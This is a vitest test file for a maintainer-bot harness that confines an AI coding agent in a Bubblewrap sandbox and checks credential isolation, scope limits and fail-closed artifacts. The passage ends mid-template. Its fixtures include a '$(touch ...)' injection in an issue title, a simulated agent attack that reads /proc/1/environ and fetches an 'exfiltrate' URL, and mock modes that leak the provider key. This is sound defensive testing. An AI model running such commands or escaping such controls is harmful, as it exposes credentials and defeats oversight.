import { execFile } from 'node:child_process'
import { createHash } from 'node:crypto'
import { fstatSync, openSync } from 'node:fs'
import { mkdir, mkdtemp, readFile, readdir, realpath, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { promisify } from 'node:util'
import { describe, expect, it } from 'vitest'
import type { CommandResult } from '@open-multi-agent/maintainer-bot'
import {
  assertHarnessCredentialIsolation,
  BoundedProcessError,
  BoundedProcessRunner,
  type BoundedProcessRunOptions,
  buildHarnessEnvironment,
  buildHarnessSettings,
  buildValidationSandboxInvocation,
  canaryArtifactSchema,
  computeCanarySnapshotRevision,
  prepareCanaryRequest,
  preflightValidationSandbox,
  readProviderKeyFromFd,
  runHarnessCanary,
  verifyArtifactHash,
  type CanaryPolicy,
  type CanaryRequest,
  type FailedCanaryArtifact,
  type RawIssueSnapshot,
  type SandboxProcessRunner,
  ValidationSandboxPreflightError,
} from '../src/index.js'

const exec = promisify(execFile)
const BASE_FILE = 'packages/core/tests/subpath-exports.test.ts'
const INJECTION = '$(touch SHOULD_NOT_EXIST)'
const FAKE_KEY = 'fake-provider-key-for-adversarial-tests'
const FAKE_KEY_HASH = createHash('sha256').update(FAKE_KEY).digest('hex')
const SANDBOX_ATTACK_MARKER = 'OMA_SANDBOX_ATTACK_MARKER'

// Mock tests never use provider credentials. Remove credential names from this
// test-only process without reading or restoring their values.
for (const name of [
  'DEEPSEEK_API_KEY',
  'ANTHROPIC_AUTH_TOKEN',
  'ANTHROPIC_API_KEY',
  'ANTHROPIC_AWS_API_KEY',
  'ANTHROPIC_FOUNDRY_AUTH_TOKEN',
]) delete process.env[name]

const ENV_PROBE_SOURCE = `import test from 'node:test'
import assert from 'node:assert/strict'
import { createHash } from 'node:crypto'
import { readFileSync } from 'node:fs'

const expected = process.env.PROVIDER_KEY_SHA256
const matches = value => expected !== undefined && createHash('sha256').update(value).digest('hex') === expected
const environmentContainsProviderKey = value => value.split('\\0').some(entry => matches(entry.slice(entry.indexOf('=') + 1)))

test('provider key is absent from validation and live ancestor environments', () => {
  let visible = Object.values(process.env).some(value => value !== undefined && matches(value))
  if (process.platform === 'linux') {
    let pid = process.pid
    for (let depth = 0; depth < 8 && pid > 1; depth += 1) {
      try {
        visible ||= environmentContainsProviderKey(readFileSync('/proc/' + pid + '/environ', 'utf8'))
        const status = readFileSync('/proc/' + pid + '/status', 'utf8')
        const match = /^PPid:\\s+(\\d+)$/m.exec(status)
        if (match === null) break
        pid = Number(match[1])
      } catch {
        break
      }
    }
  }
  console.log('provider-key-visible=' + visible)
  assert.equal(visible, false)
})
`

function sandboxAttackSource(options: { sentinelPath: string; artifactDir: string }): string {
  return `import test from 'node:test'
import assert from 'node:assert/strict'
import { readFile, writeFile } from 'node:fs/promises'

test('${SANDBOX_ATTACK_MARKER}', async () => {
  const attempts = await Promise.allSettled([
    writeFile('/workspace/packages/core/tests/sandbox-write', 'bad'),
    writeFile(${JSON.stringify(options.artifactDir + '/validation-extra')}, 'bad'),
    writeFile('/control/validation-extra', 'bad'),
    writeFile(${JSON.stringify(options.sentinelPath)}, 'bad'),
    readFile('/proc/1/environ'),
    fetch('https://example.invalid/exfiltrate'),
  ])
  assert.ok(attempts.every(attempt => attempt.status === 'rejected'))
})
`
}

class StrictMockValidationSandboxRunner implements SandboxProcessRunner {
  readonly invocations: Array<{ command: string; args: readonly string[]; options: BoundedProcessRunOptions }> = []

  constructor(
    private readonly failToStart = false,
    private readonly forcedExitCode?: number,
    private readonly boundedFailure?: BoundedProcessError,
  ) {}

  async run(command: string, args: readonly string[], options: BoundedProcessRunOptions): Promise<CommandResult> {
    this.invocations.push({ command, args, options })
    if (this.failToStart) throw new Error('mock bwrap unavailable')
    expect(command).toBe('/usr/bin/bwrap')
    expect(options.cwd).toBe('/')
    expect(options).toMatchObject({ cwd: '/', env: {} })
    expect(options.maxOutputBytes).toBeGreaterThan(0)
    expect(args).toEqual(expect.arrayContaining([
      '--die-with-parent', '--new-session', '--unshare-user', '--unshare-pid', '--unshare-net',
      '--cap-drop', 'ALL', '--proc', '/proc', '--tmpfs', '/tmp', '--tmpfs', '/home', '--clearenv',
    ]))
    if (this.boundedFailure !== undefined) throw this.boundedFailure
    if (this.forcedExitCode !== undefined) {
      return { stdout: '', stderr: 'mock sandbox setup failed\n', exitCode: this.forcedExitCode }
    }
    const repoBind = args.findIndex((value, index) => value === '--ro-bind' && args[index + 2] === '/workspace')
    expect(repoBind).toBeGreaterThanOrEqual(0)
    const hostRepo = args[repoBind + 1]!
    const source = await readFile(join(hostRepo, BASE_FILE), 'utf8')
    if (source.includes(SANDBOX_ATTACK_MARKER)) {
      return { stdout: '', stderr: 'sandbox denied hostile validation attempts\n', exitCode: 1 }
    }
    const separator = args.indexOf('--')
    const innerArgs = separator >= 0 ? args.slice(separator + 1) : []
    if (innerArgs.some(value => value.includes('process.exit(7)'))) {
      return { stdout: '', stderr: '', exitCode: 7 }
    }
    return {
      stdout: source.includes('provider-key-visible=') ? 'provider-key-visible=false\nancestor-visible=false\n' : 'mock sandbox validation passed\n',
      stderr: '',
      exitCode: 0,
    }
  }
}

const ISSUE_BODY = `## Problem

The executable subpath smoke suite omits four declared source barrels.

## Current behavior

The suite passes without importing observability, observability/file, acp, or process.

## Expected behavior

Every executable non-root source barrel has a representative runtime assertion.

## Acceptance criteria

- Add focused cases for observability, observability/file, acp, and process.
- Existing cases remain covered and the focused test passes.

## Target paths

- \`${BASE_FILE}\`

## Out of scope

- Other files, package exports, runtime behavior, dependencies, CI, and release work.
`

function snapshot(overrides: Partial<RawIssueSnapshot> = {}): RawIssueSnapshot {
  return {
    schemaVersion: 1,
    repository: 'open-multi-agent/open-multi-agent',
    baseSha: 'a'.repeat(40),
    issue: {
      number: 491,
      title: '[Test] Complete core subpath barrel smoke coverage',
      body: ISSUE_BODY,
      state: 'open',
      author: 'reporter',
      updatedAt: '2026-08-11T11:41:11Z',
      labels: ['agent-ready'],
    },
    materialEvidence: [],
    ...overrides,
  }
}

function policy(
  validationArgs: string[] = ['--test', BASE_FILE],
  cwd = '.',
  env: Record<string, string> = {},
): CanaryPolicy {
  return {
    schemaVersion: 1,
    contract: 'oma-maintainer-harness-canary-v1',
    repository: 'open-multi-agent/open-multi-agent',
    claudeCodeVersion: '2.1.220',
    model: 'deepseek-v4-flash',
    allowedPaths: ['packages/core/tests'],
    protectedPaths: ['.git', '.github', 'AGENTS.md'],
    validationRules: [{
      path: BASE_FILE,
      validationCommands: [{
        id: 'focused-subpath-test',
        command: process.execPath,
        args: validationArgs,
        cwd,
        timeoutMs: 10_000,
        env,
        unsetEnv: [],
      }],
    }],
    limits: {
      wallClockMs: 5_000,
      maxTurns: 20,
      maxChangedFiles: 1,
      maxDiffBytes: 20_000,
      maxFileBytes: 20_000,
      maxProcessOutputBytes: 100_000,
      maxValidationOutputBytes: 20_000,
    },
  }
}

describe('harness environment, settings, and credential isolation', () => {
  it('keeps the provider credential only in the parent and configures fail-closed subprocess isolation', () => {
    const env = buildHarnessEnvironment({
      source: {
        PATH: '/bin',
        GITHUB_TOKEN: 'write-token',
        GH_TOKEN: 'write-token',
        ACTIONS_RUNTIME_TOKEN: 'runtime-token',
        RUNNER_TRACKING_ID: 'tracking',
        NPM_TOKEN: 'npm-token',
        NODE_AUTH_TOKEN: 'node-token',
        SSH_AUTH_SOCK: '/tmp/ssh.sock',
        OMA_MAINTAINER_BOT_APP_PRIVATE_KEY: 'private-key',
      },
      deepSeekApiKey: FAKE_KEY,
      isolatedHome: '/tmp/isolated-home',
    })
    expect(env['ANTHROPIC_AUTH_TOKEN']).toBe(FAKE_KEY)
    expect(env['CLAUDE_CODE_SUBPROCESS_ENV_SCRUB']).toBe('1')
    for (const name of ['GITHUB_TOKEN', 'GH_TOKEN', 'ACTIONS_RUNTIME_TOKEN', 'RUNNER_TRACKING_ID', 'NPM_TOKEN', 'NODE_AUTH_TOKEN', 'SSH_AUTH_SOCK', 'OMA_MAINTAINER_BOT_APP_PRIVATE_KEY']) {
      expect(env[name]).toBeUndefined()
    }
    expect(() => assertHarnessCredentialIsolation({ GITHUB_TOKEN: 'x', CLAUDE_CODE_SUBPROCESS_ENV_SCRUB: '1' })).toThrow(/forbidden host credentials/)
    expect(() => assertHarnessCredentialIsolation({ ANTHROPIC_AUTH_TOKEN: 'x' })).toThrow(/scrubbing/)

    const settings = buildHarnessSettings({
      repoRoot: '/checkout',
      artifactDir: '/evidence',
      controlDir: '/control',
      allowedPaths: [BASE_FILE],
    })
    expect(settings.sandbox).toMatchObject({
      enabled: true,
      failIfUnavailable: true,
      allowUnsandboxedCommands: false,
      autoAllowBashIfSandboxed: false,
      excludedCommands: [],
      network: { allowedDomains: [], strictAllowlist: true, allowLocalBinding: false, allowUnixSockets: [] },
    })
    expect(settings.sandbox.credentials.envVars).toContainEqual({ name: 'ANTHROPIC_AUTH_TOKEN', mode: 'deny' })
    expect(settings.permissions.allow).toEqual([
      'Read(//checkout/**)',
      `Edit(//checkout/${BASE_FILE})`,
    ])
    expect(settings.permissions.deny).toEqual(expect.arrayContaining(['Bash', 'Write', 'WebFetch', 'WebSearch']))
    expect(JSON.stringify(settings)).not.toContain('deepseek.com')
  })
})

describe('one-shot provider key fd', () => {
  it('reads one line, closes the inherited fd, and rejects empty, multiline, and invalid descriptors', async () => {
    const directory = await mkdtemp(join(tmpdir(), 'oma-provider-fd-'))
    const validPath = join(directory, 'valid')
    await writeFile(validPath, `${FAKE_KEY}\n`, { mode: 0o600 })
    const validFd = openSync(validPath, 'r')
    expect(readProviderKeyFromFd(String(validFd))).toBe(FAKE_KEY)
    expect(() => fstatSync(validFd)).toThrow()

    for (const [name, value, message] of [
      ['empty', '', /empty/],
      ['multiline', `${FAKE_KEY}\nsecond\n`, /one line/],
    ] as const) {
      const path = join(directory, name)
      await writeFile(path, value, { mode: 0o600 })
      const fd = openSync(path, 'r')
      expect(() => readProviderKeyFromFd(String(fd))).toThrow(message)
      expect(() => fstatSync(fd)).toThrow()
    }
    expect(() => readProviderKeyFromFd('not-an-fd')).toThrow(/integer/)
    expect(() => readProviderKeyFromFd('2')).toThrow(/allowed range/)
  })
})

describe('fail-closed deterministic validation sandbox', () => {
  it('kills a multibyte output flood at the combined hard byte cap without retaining hostile output', async () => {
    const runner = new BoundedProcessRunner()
    const marker = '界'.repeat(512)
    const execution = runner.run(process.execPath, ['--eval', `const marker=${JSON.stringify(marker)}; setInterval(() => { process.stdout.write(marker); process.stderr.write(marker) }, 0); process.on('SIGTERM', () => {})`], {
      cwd: process.cwd(),
      env: {},
      timeoutMs: 5_000,
      maxOutputBytes: 1_024,
    })
    const error = await execution.catch(value => value as unknown)
    expect(error).toMatchObject({ reason: 'OUTPUT_LIMIT' })
    expect(String(error)).not.toContain(marker)
  }, 10_000)

  it('escalates timeout from TERM to KILL when a child ignores SIGTERM and still converges', async () => {
    const runner = new BoundedProcessRunner()
    const startedAt = Date.now()
    await expect(runner.run(process.execPath, ['--eval', `process.on('SIGTERM', () => {}); setInterval(() => {}, 1000)`], {
      cwd: process.cwd(),
      env: {},
      timeoutMs: 50,
      maxOutputBytes: 10_000,
    })).rejects.toMatchObject({ reason: 'TIMEOUT' })
    expect(Date.now() - startedAt).toBeLessThan(4_000)
  }, 10_000)

  it('reports a stable OS error code when Bubblewrap cannot be spawned', async () => {
    const runner = new BoundedProcessRunner()
    await expect(runner.run('/definitely-not-an-oma-command', [], {
      cwd: process.cwd(),
      env: {},
      timeoutMs: 1_000,
      maxOutputBytes: 10_000,
    })).rejects.toMatchObject({ reason: 'SPAWN_ERROR', osErrorCode: 'ENOENT' })
  })

  it('constructs a PID/proc/network-isolated read-only Bubblewrap invocation with a cleared environment', async () => {
    const fixture = await repoFixture('success')
    const command = prepareCanaryRequest({ ...snapshot(), baseSha: fixture.baseSha }, policy()).validationCommands[0]!
    const invocation = await buildValidationSandboxInvocation({ repoRoot: fixture.root, command })
    const canonicalRoot = await realpath(fixture.root)
    expect(invocation.command).toBe('/usr/bin/bwrap')
    expect(invocation.cwd).toBe('/')
    expect(invocation.env).toEqual({})
    expect(invocation.args).toEqual(expect.arrayContaining([
      '--die-with-parent', '--new-session', '--unshare-user', '--unshare-pid', '--unshare-net',
      '--unshare-ipc', '--unshare-uts', '--proc', '/proc', '--dev', '/dev',
      '--cap-drop', 'ALL',
      '--tmpfs', '/tmp', '--tmpfs', '/home', '--clearenv',
      '--ro-bind', canonicalRoot, '/workspace', '--chdir', '/workspace',
    ]))
    expect(invocation.args).not.toContain(fixture.artifactDir)
    expect(invocation.args).not.toContain(fixture.harnessDir)
    expect(invocation.args).not.toContain(process.env['HOME'])
    expect(invocation.args).not.toContain(process.env['RUNNER_TEMP'])
    expect(invocation.args).not.toContain('--bind')
  })

  it('rejects policy attempts to override protected or credential environment names', async () => {
    const fixture = await repoFixture('success')
    const validCommand = prepareCanaryRequest({ ...snapshot(), baseSha: fixture.baseSha }, policy()).validationCommands[0]!
    for (const env of [{ HOME: '/host' }, { ACTIONS_RUNTIME_TOKEN: 'bad' }]) {
      const command = { ...validCommand, env }
      await expect(buildValidationSandboxInvocation({ repoRoot: fixture.root, command })).rejects.toThrow(/environment/)
    }
  })

  it('fails closed without host fallback when Bubblewrap cannot start', async () => {
    const fixture = await repoFixture('success')
    await expect(runFixture(fixture, {
      validationSandboxProcessRunner: new StrictMockValidationSandboxRunner(true),
    })).rejects.toThrow('VALIDATION_SANDBOX_UNAVAILABLE')
    const artifact = await expectFailedArtifact(fixture, 'VALIDATION_SANDBOX_UNAVAILABLE')
    expect(artifact.validationResults).toEqual([])
  })

  it('emits bounded, redacted, machine-readable preflight evidence for the hosted failure path', async () => {
    const fixture = await repoFixture('success')
    const runner: SandboxProcessRunner = {
      async run() {
        return {
          stdout: `checkout=${fixture.root}\n`,
          stderr: `bwrap: setting up uid map: Permission denied\ntoken=unsafe-value\n/home/runner/private\n${'界'.repeat(1_000)}`,
          exitCode: 1,
        }
      },
    }
    const error = await preflightValidationSandbox({ repoRoot: fixture.root, runner })
      .catch(value => value as unknown)
    expect(error).toBeInstanceOf(ValidationSandboxPreflightError)
    expect(error).toMatchObject({
      diagnostic: {
        status: 'SANDBOX_UNAVAILABLE',
        reasonCode: 'BWRAP_EXIT_NONZERO',
        exitCode: 1,
        osErrorCode: null,
        stdout: 'checkout=<repo>',
      },
    })
    const diagnostic = (error as ValidationSandboxPreflightError).diagnostic
    expect(diagnostic.stderr).toContain('Permission denied')
    expect(diagnostic.stderr).toContain('[REDACTED]')
    expect(diagnostic.stderr).not.toContain('unsafe-value')
    expect(diagnostic.stderr).not.toContain('/home/runner')
    expect(diagnostic.stderr.endsWith('<truncated>')).toBe(true)
    expect(Buffer.byteLength(diagnostic.stderr)).toBeLessThanOrEqual(2_013)
    expect(JSON.parse(JSON.stringify(diagnostic))).toEqual(diagnostic)
  })

  it('fails closed when Bubblewrap starts but its sandbox setup exits nonzero', async () => {
    const fixture = await repoFixture('success')
    await expect(runFixture(fixture, {
      validationSandboxProcessRunner: new StrictMockValidationSandboxRunner(false, 125),
    })).rejects.toThrow('VALIDATION_FAILED')
    const artifact = await expectFailedArtifact(fixture, 'VALIDATION_FAILED')
    expect(artifact.validationResults[0]).toMatchObject({ success: false, exitCode: 125 })
  })

  it('writes only a safe failure artifact when bounded validation output is exceeded', async () => {
    const fixture = await repoFixture('success')
    await expect(runFixture(fixture, {
      validationSandboxProcessRunner: new StrictMockValidationSandboxRunner(
        false,
        undefined,
        new BoundedProcessError('OUTPUT_LIMIT', 'Validation output exceeded the hard byte limit.'),
      ),
    })).rejects.toThrow('VALIDATION_OUTPUT_LIMIT')
    const artifact = await expectFailedArtifact(fixture, 'VALIDATION_OUTPUT_LIMIT')
    expect(artifact.validationResults).toEqual([])
    expect(await readdir(fixture.artifactDir)).toEqual(['result.json'])
  })

  it('does not execute hostile model-modified validation code on the host', async () => {
    const fixture = await repoFixture('sandbox-attack')
    const sentinelPath = join(fixture.harnessDir, 'host-sentinel')
    const sandboxRunner = new StrictMockValidationSandboxRunner()
    await writeFile(sentinelPath, 'safe\n')
    fixture.attackSource = sandboxAttackSource({ sentinelPath, artifactDir: fixture.artifactDir })
    expect(fixture.attackSource).toContain("fetch('https://example.invalid/exfiltrate')")
    expect(fixture.attackSource).toContain("readFile('/proc/1/environ')")
    expect(fixture.attackSource).toContain("writeFile('/workspace/")
    await expect(runFixture(fixture, { validationSandboxProcessRunner: sandboxRunner })).rejects.toThrow('VALIDATION_FAILED')
    expect(sandboxRunner.invocations).toHaveLength(1)
    const sandboxArgs = sandboxRunner.invocations[0]!.args
    expect(sandboxArgs).not.toContain(fixture.artifactDir)
    expect(sandboxArgs).not.toContain(fixture.harnessDir)
    expect(sandboxArgs).not.toContain(sentinelPath)
    expect(await readFile(sentinelPath, 'utf8')).toBe('safe\n')
    expect(await fileExists(join(fixture.root, 'packages/core/tests/sandbox-write'))).toBe(false)
    expect(await readdir(fixture.artifactDir)).toEqual(['result.json'])
  })
})

describe('machine-readable fail-closed artifacts', () => {
  it.each([
    ['source name', { sourceEnvironment: { PATH: process.env['PATH'], DEEPSEEK_API_KEY: FAKE_KEY } }],
    ['source value', { sourceEnvironment: { PATH: process.env['PATH'], INNOCENT: `prefix-${FAKE_KEY}-suffix` } }],
  ])('rejects provider credential exposure in %s before harness spawn', async (_label, environmentOptions) => {
    const fixture = await repoFixture('success')
    await expect(runFixture(fixture, environmentOptions)).rejects.toThrow('PROVIDER_ENV_EXPOSURE')
    expect(await fileExists(fixture.capturePath)).toBe(false)
    const artifact = await expectFailedArtifact(fixture, 'PROVIDER_ENV_EXPOSURE')
    expect(JSON.stringify(artifact)).not.toContain(FAKE_KEY)
  })

  it('rejects a fake provider value in the current host environment before harness spawn', async () => {
    const fixture = await repoFixture('success')
    process.env['OMA_FAKE_INNOCENT'] = `prefix-${FAKE_KEY}-suffix`
    try {
      await expect(runFixture(fixture)).rejects.toThrow('PROVIDER_ENV_EXPOSURE')
    } finally {
      delete process.env['OMA_FAKE_INNOCENT']
    }
    expect(await fileExists(fixture.capturePath)).toBe(false)
    await expectFailedArtifact(fixture, 'PROVIDER_ENV_EXPOSURE')
  })

  it.each([
    ['missing CLI', 'success', '/definitely/missing/claude', 'CLI_UNAVAILABLE'],
    ['nonzero CLI', 'nonzero', undefined, 'CLI_NONZERO'],
    ['timeout', 'timeout', undefined, 'TIMEOUT'],
    ['malformed output', 'malformed', undefined, 'MALFORMED_OUTPUT'],
  ])('writes a safe FAILED artifact for %s', async (_label, mode, command, reasonCode) => {
    const fixture = await repoFixture(mode)
    const selectedPolicy = mode === 'timeout'
      ? { ...policy(), limits: { ...policy().limits, wallClockMs: 50 } }
      : policy()
    await expect(runFixture(fixture, { claudeCommand: command, policy: selectedPolicy })).rejects.toThrow(reasonCode)
    await expectFailedArtifact(fixture, reasonCode)
  })

  it.each([
    ['out-of-scope', 'SCOPE_VIOLATION'],
    ['extra', 'SCOPE_VIOLATION'],
    ['delete', 'SCOPE_VIOLATION'],
    ['rename', 'SCOPE_VIOLATION'],
    ['symlink', 'SCOPE_VIOLATION'],
    ['oversize', 'SCOPE_VIOLATION'],
  ])('writes a FAILED artifact for rejected %s changes', async (mode, reasonCode) => {
    const fixture = await repoFixture(mode)
    const selectedPolicy = mode === 'oversize'
      ? { ...policy(), limits: { ...policy().limits, maxDiffBytes: 100 } }
      : policy()
    await expect(runFixture(fixture, { policy: selectedPolicy })).rejects.toThrow(reasonCode)
    await expectFailedArtifact(fixture, reasonCode)
  })

  it('writes a FAILED artifact for deterministic validation failure', async () => {
    const fixture = await repoFixture('success')
    await expect(runFixture(fixture, { policy: policy(['--eval', 'process.exit(7)']) })).rejects.toThrow('VALIDATION_FAILED')
    const artifact = await expectFailedArtifact(fixture, 'VALIDATION_FAILED')
    expect(artifact.validationResults).toHaveLength(1)
    expect(artifact.validationResults[0]?.success).toBe(false)
  })

  it('discards all unsafe evidence when a fake provider key is written to the only allowed target', async () => {
    const fixture = await repoFixture('leak-key')
    await expect(runFixture(fixture)).rejects.toThrow('SECRET_LEAK')
    const artifact = await expectFailedArtifact(fixture, 'SECRET_LEAK')
    expect(await readdir(fixture.artifactDir)).toEqual(['result.json'])
    expect(JSON.stringify(artifact)).not.toContain(FAKE_KEY)
    expect(await readFile(join(fixture.artifactDir, 'result.json'), 'utf8')).not.toContain(FAKE_KEY)
  })

  it.each(['artifact-extra', 'artifact-symlink', 'artifact-directory'])('quarantines a model-created %s and keeps only a safe failure result', async mode => {
    const fixture = await repoFixture(mode)
    await expect(runFixture(fixture)).rejects.toThrow('ARTIFACT_CONTAMINATION')
    await expectFailedArtifact(fixture, 'ARTIFACT_CONTAMINATION')
    expect(await readdir(fixture.artifactDir)).toEqual(['result.json'])
  })
})

describe('canonical validation policy binding', () => {
  it.each([
    ['command', (command: CanaryRequest['validationCommands'][number]) => ({ ...command, command: 'sh' })],
    ['args', (command: CanaryRequest['validationCommands'][number]) => ({ ...command, args: ['--version'] })],
    ['cwd', (command: CanaryRequest['validationCommands'][number]) => ({ ...command, cwd: '../' })],
    ['env', (command: CanaryRequest['validationCommands'][number]) => ({ ...command, env: { SAFE_FLAG: 'changed' } })],
    ['timeout', (command: CanaryRequest['validationCommands'][number]) => ({ ...command, timeoutMs: 1 })],
  ])('rejects same-id %s mutation before spawning the harness', async (_field, mutate) => {
    const fixture = await repoFixture('success')
    await expect(runFixture(fixture, {
      requestMutator: request => ({
        ...request,
        validationCommands: [mutate(request.validationCommands[0]!)],
      }),
    })).rejects.toThrow('REQUEST_INVALID')
    expect(await fileExists(fixture.capturePath)).toBe(false)
    await expectFailedArtifact(fixture, 'REQUEST_INVALID')
  })

  it('rejects a policy-derived cwd that resolves outside repo before spawn', async () => {
    const fixture = await repoFixture('success')
    await expect(runFixture(fixture, { policy: policy(['--test', BASE_FILE], '../') })).rejects.toThrow('REQUEST_INVALID')
    expect(await fileExists(fixture.capturePath)).toBe(false)
  })
})

describe('canary snapshot semantics', () => {
  it('hashes issue body, labels, updatedAt, and included material evidence without claiming writer authority', () => {
    const original = snapshot()
    const revisions = [
      computeCanarySnapshotRevision({ ...original, issue: { ...original.issue, body: `${original.issue.body}\n` } }),
      computeCanarySnapshotRevision({ ...original, issue: { ...original.issue, labels: [...original.issue.labels, 'triaged'] } }),
      computeCanarySnapshotRevision({ ...original, issue: { ...original.issue, updatedAt: '2026-08-11T12:00:00Z' } }),
      computeCanarySnapshotRevision({
        ...original,
        materialEvidence: [{ id: 1, author: 'reviewer', body: 'material note', updatedAt: '2026-08-11T12:00:00Z' }],
      }),
    ]
    const base = computeCanarySnapshotRevision(original)
    expect(new Set([base, ...revisions]).size).toBe(5)
    const request = prepareCanaryRequest(original, policy())
    expect(request).toHaveProperty('canarySnapshotRevision', base)
    expect(request).not.toHaveProperty('issueRevision')
  })

  it('rejects tampered snapshot, base SHA, and allowed-path bindings', async () => {
    const revisionFixture = await repoFixture('success')
    await expect(runFixture(revisionFixture, {
      requestMutator: request => ({ ...request, canarySnapshotRevision: 'b'.repeat(64) }),
    })).rejects.toThrow('REQUEST_INVALID')
    expect(await fileExists(revisionFixture.capturePath)).toBe(false)

    const baseFixture = await repoFixture('success')
    await expect(runFixture(baseFixture, {
      requestMutator: request => ({ ...request, baseSha: 'b'.repeat(40) }),
    })).rejects.toThrow('BASE_MISMATCH')
    expect(await fileExists(baseFixture.capturePath)).toBe(false)

    const pathFixture = await repoFixture('success')
    await expect(runFixture(pathFixture, {
      requestMutator: request => ({ ...request, allowedPaths: ['packages/core/tests/extra.ts'] }),
    })).rejects.toThrow('REQUEST_INVALID')
    expect(await fileExists(pathFixture.capturePath)).toBe(false)
  })
})

describe('Issue #491 mock success path and artifact integrity', () => {
  it('uses structured stdin, exact settings, a restricted patch, and deterministic validation', async () => {
    const fixture = await repoFixture('success')
    const maliciousSnapshot = snapshot({ issue: { ...snapshot().issue, title: `[Test] ${INJECTION}` } })
    const request = prepareCanaryRequest({ ...maliciousSnapshot, baseSha: fixture.baseSha }, policy())
    const artifact = await runHarnessCanary({
      repoRoot: fixture.root,
      request,
      policy: policy(),
      artifactDir: fixture.artifactDir,
      deepSeekApiKey: FAKE_KEY,
      sourceEnvironment: { PATH: process.env['PATH'], GITHUB_TOKEN: 'must-not-pass', NPM_TOKEN: 'must-not-pass' },
      claudeCommand: process.execPath,
      claudeArgsPrefix: [fixture.harnessScript],
      validationSandboxProcessRunner: new StrictMockValidationSandboxRunner(),
    })
    expect(artifact.status).toBe('SUCCEEDED')
    if (artifact.status !== 'SUCCEEDED') throw new Error('Expected success artifact.')
    expect(artifact.canarySnapshotRevision).toBe(request.canarySnapshotRevision)
    expect(artifact.authority).toBe('canary_evidence_only')
    expect(artifact.productionAuthorization).toBe(false)
    expect(artifact.allowedPaths).toEqual([BASE_FILE])
    expect(artifact.changedPaths).toEqual([BASE_FILE])
    expect(artifact.validationResults[0]?.success).toBe(true)
    expect(artifact.turns).toBe(4)
    expect(verifyArtifactHash(artifact)).toBe(true)
    const patch = await readFile(join(fixture.artifactDir, 'change.patch'), 'utf8')
    const events = await readFile(join(fixture.artifactDir, 'events.jsonl'), 'utf8')
    const capture = JSON.parse(await readFile(fixture.capturePath, 'utf8')) as { argv: string[]; settings: unknown; scrub: string }
    expect(patch).toContain('/observability')
    expect(events).not.toContain('reasoning')
    expect(events).not.toContain(FAKE_KEY)
    expect(capture.scrub).toBe('1')
    expect(capture.argv.join(' ')).not.toContain(INJECTION)
    expect(capture.argv).toContain('--settings')
    expect(capture.argv).not.toContain('Bash(rg *)')
    expect(JSON.stringify(capture.settings)).not.toContain(FAKE_KEY)
    expect(await fileExists(join(fixture.root, 'SHOULD_NOT_EXIST'))).toBe(false)
    expect(JSON.stringify(artifact)).not.toContain(fixture.root)
    expect((await readdir(fixture.artifactDir)).sort()).toEqual(['change.patch', 'events.jsonl', 'result.json'])
    expect(verifyArtifactHash({ ...artifact, baseSha: 'b'.repeat(40) })).toBe(false)
  }, 15_000)

  it('runs model-modified validation code without exposing the provider key in child or observable ancestor environments', async () => {
    const fixture = await repoFixture('env-probe')
    const artifact = await runFixture(fixture, {
      policy: policy(['--test', BASE_FILE], '.', { PROVIDER_KEY_SHA256: FAKE_KEY_HASH }),
    })
    expect(artifact.status).toBe('SUCCEEDED')
    if (artifact.status !== 'SUCCEEDED') throw new Error('Expected success artifact.')
    expect(artifact.validationResults[0]?.stdout).toContain('provider-key-visible=false')
    expect(JSON.stringify(artifact)).not.toContain(FAKE_KEY)
  }, 15_000)

  it('does not persist arbitrary event labels that could contain secrets', async () => {
    const { parseHarnessStream } = await import('../src/runner.js')
    const summary = parseHarnessStream([
      JSON.stringify({ type: FAKE_KEY, subtype: FAKE_KEY }),
      JSON.stringify({ type: 'result', subtype: 'success', is_error: false, num_turns: 1 }),
    ].join('\n'), 2)
    expect(summary.events).not.toContain(FAKE_KEY)
    expect(summary.events).toContain('unknown')
  })
})

async function repoFixture(mode: string) {
  const root = await mkdtemp(join(tmpdir(), 'oma-harness-test-'))
  const artifactDir = await mkdtemp(join(tmpdir(), 'oma-harness-artifact-'))
  const harnessDir = await mkdtemp(join(tmpdir(), 'oma-harness-cli-'))
  const capturePath = join(harnessDir, 'capture.json')
  await mkdir(join(root, 'packages/core/tests'), { recursive: true })
  await mkdir(join(root, 'packages/core/src'), { recursive: true })
  await writeFile(join(root, BASE_FILE), `import test from 'node:test'\nimport assert from 'node:assert/strict'\n\ntest('subpaths', () => {\n  assert.ok('existing')\n  // TODO missing barrels\n})\n`)
  await writeFile(join(root, 'packages/core/src/extra.ts'), 'export const extra = true\n')
  await exec('git', ['init', '-q'], { cwd: root })
  await exec('git', ['config', 'user.name', 'Canary Test'], { cwd: root })
  await exec('git', ['config', 'user.email', 'canary@example.invalid'], { cwd: root })
  await exec('git', ['add', '.'], { cwd: root })
  await exec('git', ['commit', '-qm', 'fixture'], { cwd: root })
  const { stdout } = await exec('git', ['rev-parse', 'HEAD'], { cwd: root })
  const baseSha = stdout.trim()
  const harnessScript = join(harnessDir, 'mock-harness.mjs')
  const operations: Record<string, string> = {
    success: `await writeFile(target, (await readFile(target, 'utf8')).replace('// TODO missing barrels', "assert.ok('/observability')\\n  assert.ok('/observability/file')\\n  assert.ok('/acp')\\n  assert.ok('/process')"))`,
    'out-of-scope': `await writeFile(resolve('packages/core/src/extra.ts'), 'changed\\n')`,
    extra: `await writeFile(resolve('packages/core/tests/extra.ts'), 'extra\\n')`,
    delete: `await unlink(target)`,
    rename: `await rename(target, resolve('packages/core/tests/renamed.ts'))`,
    symlink: `await unlink(target); await symlink('packages/core/src/extra.ts', target)`,
    oversize: `await writeFile(target, 'x'.repeat(2000))`,
    'leak-key': `await writeFile(target, process.env.ANTHROPIC_AUTH_TOKEN + '\\n')`,
    'env-probe': `await writeFile(target, ${JSON.stringify(ENV_PROBE_SOURCE)})`,
    'sandbox-attack': `await writeFile(target, globalThis.__attackSource)`,
    'artifact-extra': `await writeFile(${JSON.stringify(join(artifactDir, 'model-extra'))}, 'bad\\n')`,
    'artifact-symlink': `await symlink(${JSON.stringify(capturePath)}, ${JSON.stringify(join(artifactDir, 'model-link'))})`,
    'artifact-directory': `await mkdir(${JSON.stringify(join(artifactDir, 'model-directory'))})`,
    nonzero: `process.exit(9)`,
    timeout: `await new Promise(resolvePromise => setTimeout(resolvePromise, 10_000))`,
    malformed: `process.stdout.write('not-json\\n'); process.exit(0)`,
  }
  await writeFile(harnessScript, `
import { mkdir, readFile, rename, symlink, unlink, writeFile } from 'node:fs/promises'
import { resolve } from 'node:path'
const target = resolve(${JSON.stringify(BASE_FILE)})
